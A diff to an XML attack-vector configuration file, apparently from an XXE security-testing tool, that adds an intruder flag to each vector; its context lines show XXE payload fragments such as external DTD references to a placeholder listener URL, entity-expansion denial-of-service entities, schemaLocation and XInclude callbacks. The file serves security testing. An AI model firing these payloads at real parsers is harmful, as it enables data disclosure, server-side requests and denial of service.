@@ -10,7 +10,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "§tf_listenURL§">
@@ -34,7 +34,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY dos SYSTEM "§tf_listenURL§" >
@@ -60,7 +60,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-16</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
 <!DOCTYPE data [
@@ -90,7 +90,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-7</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-7"?>
 <!DOCTYPE data [
@@ -120,7 +120,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY dos SYSTEM "§tf_listenURL§" >
@@ -146,7 +146,7 @@
         <externalResources>true</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data SYSTEM "§tf_helperURL§" [
 <!ELEMENT data (#PCDATA)>
@@ -184,7 +184,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector>
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY a0 "dos" >
@@ -208,7 +208,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector>
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY a0 "dosdosdosdosdosdosdos"
@@ -249,7 +249,7 @@
         <externalResources>true</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
@@ -285,7 +285,7 @@
         <externalResources>true</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
@@ -325,7 +325,7 @@
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[<?xml version='1.0'?>
 <data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -344,7 +344,7 @@ xsi:noNamespaceSchemaLocation="§tf_listenURL§">4</data>]]></directMessage>
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[ <?xml version='1.0'?>
 <ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -364,7 +364,7 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
         <externalResources>true</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "§tf_helperURL§">
@@ -394,7 +394,7 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
         <externalResources>true</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0"?>
 <!DOCTYPE data [
@@ -432,7 +432,7 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
         <externalResources>false</externalResources>
         <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[<?xml version='1.0'?>
 <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="§tf_listenURL§"></xi:include></data>]]></directMessage>
@@ -450,7 +450,7 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
             <externalResources>true</externalResources>
             <encoding>UTF-8</encoding>
         </params>
-        <attackvectors>
+        <attackvectors intruderVector="false">
         <attackvector type="system" default="true">
         <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY % remote SYSTEM "§tf_helperURL§">
